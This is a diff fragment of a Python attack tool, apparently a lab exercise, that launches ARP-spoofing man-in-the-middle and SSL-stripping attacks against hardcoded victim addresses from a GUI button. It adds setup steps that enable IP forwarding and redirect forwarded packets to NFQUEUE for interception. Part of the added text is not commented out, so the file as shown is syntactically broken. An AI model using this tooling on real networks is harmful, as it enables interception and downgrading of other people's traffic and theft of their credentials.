@@ -274,12 +274,12 @@ def main():
     def ssl():
         print("SSL Stripping...")
         # Perform Man-in-the-Middle using a separate thread 
-        mitm = threading.Thread(\
-            target=arp_mitm_gateway.spoof, args=  \
-                ("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
-        mitm.start()
+        #mitm = threading.Thread(target=arp_mitm_gateway.spoof, args=("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT))
+        arp_mitm_gateway.spoof("10.0.2.12", ipAttackerNAT, ipVictimNAT, "08:00:27:0B:4D:33", macAttackerNAT, macVictimNAT, interfaceNAT)
+
+
         # initiate SSL stripping attack on the NAT interface
-        # ssl_strip.ssl_strip(interfaceNAT)
+        # ssl_strip.ssl_strip()
 
     def exit():
         win.destroy()
@@ -315,6 +315,13 @@ if __name__ == "__main__":
 '''
     print(interfaceNAT) # enp0s8
     print(interfaceLAN) # enp0s3
+
+# make sure that IP forwarding is enabled on the attacker machine (M3). 
+This can be done by modifying the system configuration using the following command:
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Before running this script, you need to set up iptables to redirect packets to the NetfilterQueue
+sudo iptables -I FORWARD -j NFQUEUE --queue-num 0 
 
 
 # ps aux | grep python
